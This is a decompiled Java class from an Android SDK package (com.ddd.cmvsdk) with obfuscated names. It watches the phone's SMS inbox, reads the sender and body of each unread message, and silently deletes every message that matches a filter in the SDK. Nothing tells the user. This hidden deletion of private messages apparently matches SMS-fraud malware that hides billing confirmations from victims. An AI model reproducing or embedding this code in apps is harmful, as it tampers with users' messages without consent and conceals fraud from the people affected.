package com.ddd.cmvsdk;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public final class j
  extends ContentObserver
{
  private Context a;
  private String[] b = { "_id", "address", "body", "date", "type", "read" };
  
  public j(CMVSDK paramCMVSDK, Context paramContext, Handler paramHandler)
  {
    super(paramHandler);
    this.a = paramContext;
  }
  
  public final void onChange(boolean paramBoolean)
  {
    Cursor localCursor = this.a.getContentResolver().query(Uri.parse("content://sms/inbox"), this.b, " read=? ", new String[] { "0" }, "date desc");
    if (localCursor != null) {}
    for (;;)
    {
      if (!localCursor.moveToNext())
      {
        localCursor.close();
        return;
      }
      int i = localCursor.getInt(localCursor.getColumnIndex("_id"));
      String str1 = localCursor.getString(localCursor.getColumnIndex("address")).trim();
      String str2 = localCursor.getString(localCursor.getColumnIndex("body")).trim();
      if ((i > 0) && (CMVSDK.a(str1, str2))) {
        this.a.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + i, null);
      }
    }
  }
}
